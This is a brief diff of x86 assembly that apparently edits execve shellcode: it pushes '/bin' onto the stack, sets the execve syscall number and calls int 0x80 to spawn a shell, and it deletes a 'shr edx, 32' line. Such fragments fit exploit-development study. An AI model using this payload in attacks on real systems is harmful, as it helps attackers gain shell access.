@@ -11,6 +11,5 @@ _start:
 	push esi
 	push 0x6e69622f
 	mov ebx, esp
-	shr edx, 32
 	add eax, 11
 	int 0x80
